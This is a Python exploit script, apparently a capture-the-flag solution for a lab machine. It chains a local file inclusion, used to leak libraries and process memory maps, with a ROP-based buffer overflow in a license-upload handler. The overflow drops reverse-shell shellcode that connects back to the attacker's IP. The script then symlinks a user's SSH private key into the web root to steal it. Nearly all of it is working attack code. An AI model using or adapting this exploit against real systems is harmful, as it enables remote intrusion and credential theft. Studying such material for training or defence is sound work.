import requests
import os
from pwn import *
import re
from struct import pack
import threading
import socket
from tqdm import tqdm


URL = "http://10.10.11.154"
YOURIP = "10.10.14.33"

if os.geteuid() != 0:
    print("[-] Please run as root")
    exit(1)

def threaded(fn):
    def wrapper(*args, **kwargs):
        thread = threading.Thread(target=fn, args=args, kwargs=kwargs)
        thread.start()
        return thread
    return wrapper

class GetAllBinary:
    def __init__(self, url=URL):
        self.session = requests.Session()
        self.url = url
        if not os.path.exists("./binary"):
            os.mkdir("./binary")

    @threaded
    def get_binaryof(self, binPath: str):
        session = self.session
        binary = session.get(
            self.url + f"/index.php?page={binPath}", allow_redirects=False).content
        binary_name = binPath.split("/")[-1]
        with open(f"./binary/{binary_name}", "wb") as f:
            f.write(binary)
        return None

    def start(self):
        # self.get_binaryof("/usr/bin/activate_license")
        # self.get_binaryof("/usr/lib/x86_64-linux-gnu/libdl-2.31.so")
        # self.get_binaryof("/usr/lib/x86_64-linux-gnu/libpthread-2.31.so")
        # self.get_binaryof("/usr/lib/x86_64-linux-gnu/libm-2.31.so")
        self.get_binaryof("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
        self.get_binaryof("/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6")
        # self.get_binaryof("/usr/lib/x86_64-linux-gnu/ld-2.31.so")
        
        # wait for all threads to finish
        for t in threading.enumerate():
            if t is threading.current_thread():
                continue
            t.join()
        return None


class GenBufferOverflow:
    def __init__(self, yourIp, url=URL):
        self.url = url
        self.offset = 520
        ip = socket.inet_aton(yourIp)
        revshell =  b""
        revshell += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
        revshell += b"\x97\x48\xb9\x02\x00\x01\xbb"+    ip     +b"\x51\x48"
        revshell += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
        revshell += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
        revshell += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
        revshell += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
        self.revshell = revshell
    
    def get_pidof_activate_licens(self):
        r = requests.get(self.url + "/index.php?page=/proc/sched_debug", allow_redirects=False)
        pid = re.search("activate_licens\s+([0-9]+)", r.text).group(1)
        return pid
    
    def get_memory_mapof_activate_licens(self, pid):
        r = requests.get(f"{self.url}/index.php?page=/proc/{pid}/maps", allow_redirects=False)
        libcb = int(re.search("^.*libc.*$", r.text, re.M).group(0).split("-")[0], 16)
        libsb = int(re.search("^.*libsqlite.*$", r.text, re.M).group(0).split("-")[0], 16)
        sBase = int(re.search("^.*\[stack\].*$", r.text, re.M).group(0).split("-")[0], 16)
        sEnd = int(re.search("^.*\[stack\].*$", r.text, re.M).group(0).split("-")[1].split()[0], 16)
        return libcb, libsb, sBase, sEnd
        
    def ropping(self, libcb, libsb, sBase, sEnd):
        sSize = sEnd - sBase
        offset = self.offset
        
        context.clear(arch='amd64')
        libc = ELF("./libc-2.31.so", checksec=False)
        libc.address = libcb
        libsql = ELF("./libsqlite3.so.0.8.6", checksec=False)
        libsql.address = libsb
        
        rop = ROP([libc, libsql])
        prt = libc.symbols['mprotect']
        rdi = rop.rdi[0]
        rsi = rop.rsi[0]
        rdx = rop.rdx[0]
        rsp = rop.jmp_rsp[0]
        
        payload = b'A' * offset
        payload += pack("<Q", rdi) + pack("<Q", sBase)
        payload += pack("<Q", rsi) + pack("<Q", sSize)
        payload += pack("<Q", rdx) + pack("<Q", 7)
        payload += pack("<Q", prt)
        payload += pack("<Q", rsp)
        payload += self.revshell
        return payload
    
    def start(self):
        pid = self.get_pidof_activate_licens()
        libcb, libsb, sBase, sEnd = self.get_memory_mapof_activate_licens(pid)
        myrop = self.ropping(libcb, libsb, sBase, sEnd)
        return myrop

class ReverseShell:
    def __init__(self, payload, yourIp=YOURIP, url=URL):
        self.url = url
        self.port = 443
        self.yourIp = yourIp
        self.payload = payload
    
    @threaded
    def send_payload(self):
        requests.post(f"{self.url}/activate_license.php",
                      files = { "licensefile": self.payload } 
                      )
        return None
    
    def listen_shell(self):
        shell = listen(443, timeout=60).wait_for_connection()
        shell.sendline(b"export TERM=xterm HOME=/var/www")
        return shell
    
    def start(self):
        self.send_payload()
        return self.listen_shell()

class GetUserDev:
    def __init__(self, revshell: listen):
        self.revshell = revshell
    
    def get_user_dev(self):
        p = self.revshell
        p.sendline(b"cd /var/www/html")
        p.sendline(b"ln -s /home/dev/.ssh/id_rsa id_rsa")
        # sleep 1 minute
        for i in tqdm(range(60)):
            time.sleep(1)
        p.sendline(b"ls -la")
        p.interactive()
    
    def start(self):
        self.get_user_dev()
        pass
        

def main():
    # GetAllBinary().start()
    os.chdir("./binary")
    os.system("chmod +x *")
    payload = GenBufferOverflow(yourIp=YOURIP).start()
    shell = ReverseShell(payload=payload).start()
    GetUserDev(revshell=shell).start()
    

if __name__ == "__main__":
    main()
